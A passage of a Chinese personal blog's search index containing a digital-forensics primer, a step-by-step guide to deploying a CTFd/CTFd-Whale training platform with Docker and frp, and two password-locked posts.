<h3 id="2、忘了长啥样，但是进去就得处理"><a href="#2、忘了长啥样，但是进去就得处理" class="headerlink" title="2、忘了长啥样，但是进去就得处理"></a>2、忘了长啥样，但是进去就得处理</h3><p>点击设置-系统设置，在分享一栏输入自己的github账号名。然后镜像没事别乱点分享，即可。</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>靶场环境很大很大！之前随便下了10个靶场就占了将近10G的内存！合理分配好内存！</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>vulfocus搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>零基础入门电子数据取证</title>
    <url>/2021/08/28/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h1 id="零基础入门电子数据取证"><a href="#零基础入门电子数据取证" class="headerlink" title="零基础入门电子数据取证"></a>零基础入门电子数据取证</h1><span id="more"></span>
<h2 id="电子数据基础"><a href="#电子数据基础" class="headerlink" title="电子数据基础"></a>电子数据基础</h2><h3 id="什么是电子数据"><a href="#什么是电子数据" class="headerlink" title="什么是电子数据"></a>什么是电子数据</h3><p>电子数据可以是人为生成、自动生成或者两者结合下生成的。</p>
<p>人为生成的电子数据是以用户的主观意志创造、复制或者衍生出的新数据，使用户主动创造的痕迹，一般不会特意清除。比如使用邮件客户端收发的邮件、通过下载工具下载资料等。</p>
<p><img src="https://i.loli.net/2021/08/28/eJwrMI3qVEOn7Pv.png" alt="image-20210828082739631"></p>
<p><img src="https://i.loli.net/2021/08/28/rw3tcqXW7zjZ8H4.png" alt="image-20210828082755764"></p>
<p>自动生成的电子数据是操作系统或者应用系统自动生成的记录一定信息的数据，不被用户的主观意志左右。通常这些数据是从系统启动开始，在用户不经意间不断产生的，而且会在用户的使用过程中随时变化，比如操作系统的开关机时间、USB设备的插拔记录、通过浏览器上网产生的缓存记录等。</p>
<h3 id="用户痕迹的特点"><a href="#用户痕迹的特点" class="headerlink" title="用户痕迹的特点"></a>用户痕迹的特点</h3><p>人为、自动和两者结合的方式产生的用户痕迹数据贯穿了使用计算机等设备的整个过程，也使得第三方调查者能够通过调查这些痕迹数据对嫌疑人进行用户行为串联和分析，从而给还原案件的真相提供了可能。</p>
<p>用户痕迹电子数据具备着电子数据的普遍特点：无形性、多样性、客观性、易破坏性、隐蔽性等。</p>
<p>由于痕迹产生于用户使用计算机等设备的过程中，因此还具备着记录用户操作历史、行为轨迹、通信记录、密码信息等隐私数据的特点。</p>
<h2 id="电子数据与电子数据取证"><a href="#电子数据与电子数据取证" class="headerlink" title="电子数据与电子数据取证"></a>电子数据与电子数据取证</h2>]]></content>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2021/07/25/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f6421f615c3e3f8b463e33f014409a0619f33b4b01c4546e793b53aab1c7bdd7"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd+CTFd-whale安装教程</title>
    <url>/2021/07/11/CTFd+CTFd-whale%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="动态靶机CTF靶场平台搭建"><a href="#动态靶机CTF靶场平台搭建" class="headerlink" title="动态靶机CTF靶场平台搭建"></a>动态靶机CTF靶场平台搭建</h1><p>闲来无事，嫖了阿里云2个月试用机搭了一个训练靶场，在此记录详细过程。对应的是赵总博客的第一种模式：单机 Direct 模式</p>
<span id="more"></span>
<h2 id="换源-虚拟机调配时使用"><a href="#换源-虚拟机调配时使用" class="headerlink" title="换源(虚拟机调配时使用)"></a>换源(虚拟机调配时使用)</h2><p>Ubuntu系统中，软件源文件地址为：<code>/etc/apt/sources.list</code></p>
<p>1.备份原来的源，将以前的源备份一下，以防以后可以用的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<p>2.打开<code>/etc/apt/sources.list</code>文件，在前面添加如下条目，并保存。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#添加阿里源s</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">#添加清华源</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span><br></pre></td></tr></table></figure>
<p>3.更新</p>
<p>更新源</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>如出现依赖问题，解决方式如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure>
<p>更新软件：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/142014944">Ubuntu20.04软件源更换</a></p>
<h2 id="安装Docker和Docker-Compose"><a href="#安装Docker和Docker-Compose" class="headerlink" title="安装Docker和Docker Compose"></a>安装Docker和Docker Compose</h2><p>本部分内容完全参考：<a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>Docker使用阿里云镜像源安装：</p>
<p><a href="https://docs.docker.com/engine/install/ubuntu/">Ubuntu安装docker官网</a></p>
<h4 id="卸载老版本Docker："><a href="#卸载老版本Docker：" class="headerlink" title="卸载老版本Docker："></a>卸载老版本Docker：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
<h4 id="更新软件"><a href="#更新软件" class="headerlink" title="更新软件"></a>更新软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h4 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure>
<h4 id="添加GPG密钥"><a href="#添加GPG密钥" class="headerlink" title="添加GPG密钥"></a>添加GPG密钥</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<h4 id="查看密钥是否添加成功"><a href="#查看密钥是否添加成功" class="headerlink" title="查看密钥是否添加成功"></a>查看密钥是否添加成功</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>
<p>若添加成功，会显示如下信息：</p>
<p><img src="https://i.loli.net/2021/07/22/sPKywfbAjIpiHJS.png" alt="img"></p>
<h4 id="添加阿里云的软件源"><a href="#添加阿里云的软件源" class="headerlink" title="添加阿里云的软件源"></a>添加阿里云的软件源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure>
<p>若添加成功，则在<code>/etc/apt/sources.list</code>中可看见类似如下的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu bionic stable</span><br></pre></td></tr></table></figure>
<h4 id="再次更新软件"><a href="#再次更新软件" class="headerlink" title="再次更新软件"></a>再次更新软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<h4 id="安装最新版的docker-ce"><a href="#安装最新版的docker-ce" class="headerlink" title="安装最新版的docker-ce"></a>安装最新版的docker-ce</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>安装完毕之后，通过<code>docker --version</code>来验证安装是否成功：</p>
<p><img src="https://hujiekang.top/images/uploads/big/bbdd287fc77a316f10f8e52c39c47da9.png" alt="img"></p>
<h4 id="启动Docker服务并设置为开机启动"><a href="#启动Docker服务并设置为开机启动" class="headerlink" title="启动Docker服务并设置为开机启动"></a>启动Docker服务并设置为开机启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure>
<h4 id="然后为Docker添加镜像加速"><a href="#然后为Docker添加镜像加速" class="headerlink" title="然后为Docker添加镜像加速"></a>然后为Docker添加镜像加速</h4><p>修改<code>/etc/docker/daemon.json</code>文件（若不存在则自行创建），加入如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://hub-mirror.c.163.com/(地址)&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面更换为想要的镜像地址即可。下面有几个可选项：</p>
<blockquote>
<ul>
<li>阿里云容器镜像服务（使用自己的阿里云账户申请）：<a href="https://cr.console.aliyun.com/#/accelerator">https://cr.console.aliyun.com/#/accelerator</a></li>
<li>DaoCloud：<a href="https://www.daocloud.io/mirror">https://www.daocloud.io/mirror</a></li>
<li>网易：<a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com/</a></li>
</ul>
</blockquote>
<p>修改文件后，执行命令重启docker服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h3 id="安装Docker-compose"><a href="#安装Docker-compose" class="headerlink" title="安装Docker-compose"></a>安装Docker-compose</h3><p>接下来是安装Docker Compose。官方给的是从GitHub下载安装，依然速度很慢，所以采用DaoCloud的镜像源来安装。</p>
<h4 id="下载docker-compose"><a href="#下载docker-compose" class="headerlink" title="下载docker-compose"></a>下载docker-compose</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="为其添加可执行权限"><a href="#为其添加可执行权限" class="headerlink" title="为其添加可执行权限"></a>为其添加可执行权限</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="使用docker-compose-version验证安装："><a href="#使用docker-compose-version验证安装：" class="headerlink" title="使用docker-compose --version验证安装："></a>使用<code>docker-compose --version</code>验证安装：</h4><p><img src="https://hujiekang.top/images/uploads/big/5343f8893310644d336b9011120b39c2.png" alt="img"></p>
<h4 id="启用Docker-Swarm"><a href="#启用Docker-Swarm" class="headerlink" title="启用Docker Swarm"></a>启用Docker Swarm</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker swarm init  # 初始化</span><br><span class="line">docker node ls  # 查看节点ID</span><br><span class="line">docker node update --label-add name=linux-1 &lt;节点 ID&gt;  # 添加别名(一定要记住！)</span><br></pre></td></tr></table></figure>
<h2 id="安装CTFd-amp-CTFd-Whale"><a href="#安装CTFd-amp-CTFd-Whale" class="headerlink" title="安装CTFd&amp;CTFd-Whale"></a>安装CTFd&amp;CTFd-Whale</h2><h3 id="下载赵总仓库的CTFd源码"><a href="#下载赵总仓库的CTFd源码" class="headerlink" title="下载赵总仓库的CTFd源码"></a>下载赵总仓库的CTFd源码</h3><p>（是否需要回滚忘了。参考博主的版本为<strong><code>9d8981a9808078a0634b13e61190cec4556782e4</code></strong>，如有报错，可以回滚）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone -b single https://github.com/glzjin/CTFd.git</span><br><span class="line">cd CTFd</span><br></pre></td></tr></table></figure>
<h3 id="坑1："><a href="#坑1：" class="headerlink" title="坑1："></a>坑1：</h3><p>清华源将python2和python3分开来了，所以Dockerfile里要把python和python-dev改掉。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/CTFd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/CTFd /var/<span class="built_in">log</span>/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirror.tuna.tsinghua.edu.cn/g&#x27;</span> /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add \</span></span><br><span class="line"><span class="bash">        python3 \</span></span><br><span class="line"><span class="bash">        python3-dev \</span></span><br><span class="line"><span class="bash">        linux-headers \</span></span><br><span class="line"><span class="bash">        libffi-dev \</span></span><br><span class="line"><span class="bash">        gcc \</span></span><br><span class="line"><span class="bash">        make \</span></span><br><span class="line"><span class="bash">        musl-dev \</span></span><br><span class="line"><span class="bash">        py-pip \</span></span><br><span class="line"><span class="bash">        mysql-client \</span></span><br><span class="line"><span class="bash">        git \</span></span><br><span class="line"><span class="bash">        openssl-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /opt/CTFd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; <span class="keyword">do</span> \</span></span><br><span class="line"><span class="bash">      <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$d</span>/requirements.txt&quot;</span> ]; <span class="keyword">then</span> \</span></span><br><span class="line"><span class="bash">        pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r <span class="variable">$d</span>/requirements.txt; \</span></span><br><span class="line"><span class="bash">      <span class="keyword">fi</span>; \</span></span><br><span class="line"><span class="bash">    <span class="keyword">done</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /opt/CTFd/docker-entrypoint.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> adduser -D -u 1001 -s /bin/sh ctfd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R 1001:1001 /opt/CTFd /var/<span class="built_in">log</span>/CTFd /var/uploads</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<h3 id="坑2："><a href="#坑2：" class="headerlink" title="坑2："></a>坑2：</h3><p>requirements.txt少装了一个库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">greenlet&#x3D;&#x3D;0.4.15</span><br></pre></td></tr></table></figure>
<h3 id="配置Frp-Token"><a href="#配置Frp-Token" class="headerlink" title="配置Frp Token"></a>配置Frp Token</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim frp/frps.ini</span><br></pre></td></tr></table></figure>
<p> frps.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6490</span><br><span class="line">token &#x3D; randomme</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim frp&#x2F;frpc.ini</span><br></pre></td></tr></table></figure>
<h3 id="frpc-ini"><a href="#frpc-ini" class="headerlink" title="frpc.ini"></a>frpc.ini</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">token &#x3D; randomme</span><br><span class="line">server_addr &#x3D; 172.1.0.1</span><br><span class="line">server_port &#x3D; 6490</span><br><span class="line">pool_count &#x3D; 200</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">admin_addr &#x3D; 172.1.0.3</span><br><span class="line">admin_port &#x3D; 7400</span><br></pre></td></tr></table></figure>
<h3 id="下载CTFd-Whale插件"><a href="#下载CTFd-Whale插件" class="headerlink" title="下载CTFd-Whale插件"></a>下载CTFd-Whale插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule update --init  # 初始化CTFd-Whale插件</span><br></pre></td></tr></table></figure>
<h3 id="（可选）修改CTFd平台运行端口"><a href="#（可选）修改CTFd平台运行端口" class="headerlink" title="（可选）修改CTFd平台运行端口"></a>（可选）修改CTFd平台运行端口</h3><p>打开<code>docker-compose.yml</code>，修改CTFd容器的端口信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:8000&quot;  # 意为将外部机器的80端口映射至CTFd容器的8000端口，只需修改前者即可</span><br></pre></td></tr></table></figure>
<h3 id="部署容器"><a href="#部署容器" class="headerlink" title="部署容器"></a>部署容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>部署容器，部署完毕后就可以用<code>http://ip:指定的端口</code>访问CTFd进行设置。</p>
<p>参考链接：</p>
<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
<p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a></p>
<h2 id="配置CTFd-Whale"><a href="#配置CTFd-Whale" class="headerlink" title="配置CTFd-Whale"></a>配置CTFd-Whale</h2><blockquote>
<p>（本次配置中踩的最大的坑）下面提到的所有端口，都需要在<strong>云服务器安全组+系统内防火墙</strong>中开放！！！否则Frp API将无法访问，Frp客户端也无法连接上服务端！！！</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">配置项</th>
<th style="text-align:center">对应值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Docker API URL</td>
<td style="text-align:center">unix://var/run/docker.sock</td>
</tr>
<tr>
<td style="text-align:center">Frp API IP</td>
<td style="text-align:center">172.1.0.3</td>
</tr>
<tr>
<td style="text-align:center">Frp API Port</td>
<td style="text-align:center">7400</td>
</tr>
<tr>
<td style="text-align:center">Frp Http Domain Suffix</td>
<td style="text-align:center">None</td>
</tr>
<tr>
<td style="text-align:center">Frp Http Port</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct IP Address</td>
<td style="text-align:center">填入服务器公网IP</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct Minimum Port</td>
<td style="text-align:center">28000</td>
</tr>
<tr>
<td style="text-align:center">Frp Direct Maximum Port</td>
<td style="text-align:center">容器最大的端口值(28100)</td>
</tr>
<tr>
<td style="text-align:center">Max Container Count</td>
<td style="text-align:center">最大允许容器数量(100)</td>
</tr>
<tr>
<td style="text-align:center">Max Renewal Times</td>
<td style="text-align:center">最大允许更新次数(3)</td>
</tr>
<tr>
<td style="text-align:center">Frp config template</td>
<td style="text-align:center">[common]<br/>token = randomme<br/>server_addr = 172.1.0.1<br/>server_port = 6490<br/>pool_count = 200<br/>tls_enable = true<br/><br/>admin_addr = 172.1.0.3<br/>admin_port = 7400</td>
</tr>
<tr>
<td style="text-align:center">Docker Auto Connect Containers</td>
<td style="text-align:center">ctfd_frpc_1（即docker里面frpc容器的名称）</td>
</tr>
<tr>
<td style="text-align:center">Docker Auto Connect Network</td>
<td style="text-align:center">ctfd_frp_containers（即承载开启的题目容器的网络名称）</td>
</tr>
<tr>
<td style="text-align:center">Docker Dns Setting</td>
<td style="text-align:center">可有可无</td>
</tr>
<tr>
<td style="text-align:center">Docker Swarm Nodes</td>
<td style="text-align:center">填入一开始修改的别名(linux-1)</td>
</tr>
<tr>
<td style="text-align:center">Docker Multi-Container Network Subnet</td>
<td style="text-align:center">173.0.0.0/16</td>
</tr>
<tr>
<td style="text-align:center">Docker Multi-Container Network Subnet New Prefix</td>
<td style="text-align:center">24</td>
</tr>
<tr>
<td style="text-align:center">Docker Container Timeout</td>
<td style="text-align:center">容器的存活时间（单位：秒）(3600)</td>
</tr>
</tbody>
</table>
</div>
<h2 id="配置题目"><a href="#配置题目" class="headerlink" title="配置题目"></a>配置题目</h2><p><img src="https://i.loli.net/2021/07/23/JxSgWGnlwKTpihD.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/07/23/OaUQgY9FWpG7ldx.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/07/23/OaUQgY9FWpG7ldx.png" alt=""></p>
<p><img src="https://i.loli.net/2021/07/23/Ynm2AdB8QlebqCi.png" alt="image-20210723110250464"></p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a></p>
<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/">CTFd平台搭建记录</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTFd环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Django项目开发参考资料</title>
    <url>/2021/06/15/Django%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="17b99393132b7109a190bf05ffb92ffb7dfc61fb3642fa5b0c0530a8f093f4c2">7ccfaf1f7029b10e37ca00b3f9e0ccb2a13bb745ba77da3fe2b896fe385e6ba734ee173de03bfd955c24f53eae595ddb44399c3c1789d5f7f5a5d2e58eb095e4a14b57bdf22c1feb0949784d9f2c9bd977ae7211782696e985f40aaccbf13dfacea26168b7c7b4619cfb4f83740027c9ed2b83a0f8252b1bc4fb08bd7ef8a53eb6e16c194b5a14dfed5486d67c31e589b27911564939b391734b148ae4dd6eee5789014653302857bddeaa910f26961bde8b7dd7afe6ca096bbad358455f750de96562b978be79dd804783508c96b08d8d2dcbfaaa1ac45419be7ec828356d6f11c3334430498628dd8be7ec6c82fad8b9b389ef606ed9c4486dfbd8e9c857354839f34b2e53b5a8e20ee7e64cb227b0393899cd143a320557a53e0aeb4f72b1dae64bbca77916c1dc5cd6dcc567d03f3bdde3eccd4460543bee2b257bff0726e99efcaea9236c9d57d717c568860e413683c487fa834e97e5096108732e30aac14741e8f3d270e0d618fc96f39eac26b7e4fa8d435913fe49ae682a3f2b7a32550f3a38fcffdd696241a9b638e05b21b3410b2142af3af9293add774efe89e1e38e7defc9ff986e0de148050d1c58c8ea09a96eaa762d73fa6ecf75e1f78131c6624ed57ea31f3433de59b85157699f30c07592cf67a1c702c9dfe1c31b0478907c19b29c78439eb47e2da2885d2858426106316f0223cfdde468d4cba3317f71ff5ecb3daebf64800eaef65d7b4d1bcb11a8ff9690f06ce5c32e4cae576d9032ff796c5ce14fe37055c2150309b5a436a335b0852ee41ea51e1c0358e6ef4f6c01b648986f13ecef80bcad507d8bf7aa0617428ea084cde89e24ed4a215fb97411b8f97630ddffe10ae01eeba789eaf13529e6f41ba0cf46327cdf456a8027232aea82f9a88e7954305a245ecd7b5dcef9d21ac1d37b6efff40eb17346b4a145dd6b8988a03ce45fca828965df9df4b48be45bec47129262cd66515451848ef35e7ab7bb8dac84c432395eac1d12fa5cca76bce9b507d99cb96650fbf15b5b5b576412f3909b35b6953e0536bc9768893a2d25a68adef95d9913766437ab6dd2ef19624cc7353d1b067d686a73e157c62a1434c1243cc425ad3c46d376e23bc2cef057a9cc7ed833c399e91f5016838362236ec63c49557c21d25fd43b83019a010d4e64485c730d0e28361f0a60f2e548329b885b04cfc107ad109594ff372516fef95fb8cbb482c5819f2da341c3eff0ab0bbbc1b9dd30efbdbc7fdcaadc4413f45bfd4d988065c847a74b156c7275be48678a9b91ae235f0151447e60abb9b678eb6ee6f202fe58566b90c48ab18021e6740f87f8cc0b75f8e07384d26671cc4d5b70b8349dee940d20bad0a2b7978bfae85bbed53ca111cc308f47ebc5eb94d04cdc51acb780c6828a7ff9217a41abc6d9bdf71495fdabf58fa4a269d63a84c03df563a78de7622759289229e117cfc474c0596676f40447d09c865a28f4d48398e38afa99eb0948ef4a695eeda94dc1f07ffe513077658a2432aad0ec9d88973d2281ec4677e8910da3b35eda346bb433184be854e3336e6ca2f77d32b735bdac48ff7815a13e94945cacd3548a4c9c0ecf00e257d5de3a014202227f61f5ba15a2984b031511ef526513865861e12f77e1c9949ec6e3b463055dd937dbe096c86bd4ccc784a365ea84a028b50c355f891a764cd9c1952cf4fade28c0bf8d6c0ed88fd3a6ffe8c112f1ba436a1e9afef5201842d3bbce68ed8c508a64f474286e00f3064d6828b6c6704552e1d6b1909fe97ee8e238664062abaf1f0fe473aa6596e7d49878617d77c7938cfb6931bbd5158263648c6a528bdb82d8ace447d894a5023e8c2543e1071acb934496a8953915ee6ed2c36fc6955fca8b4f2a5500b6d51e2e6ec6ef99a2b33b0b7575892319c83610bcb5f4dcb9018f6e506163c33f1e3abb153e3c6a6ca94b8749a11c9ef1e7932188f1d7386217a780fbb0bd721ec42989168f0b98b0d9d44966c2f2935d50b323f88a554526641d70cd1f15828cf032981fc97c8590028e58589dd4c8d25f4101fd76fa583d9d33992cc32fb9a7b2211d4789dc915d359a04dd074bd22155cc22cd8082c3767b30ba3220c9cbb44005c64c1bcb96c05ec4bf2431eb37f1e0bd3fa3115d8d770793877153676106d55434d828bec683ce21e8f3468dd95812e9cf9e097c74cf1beca93e055b130118c108bdfd493d498f182799</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
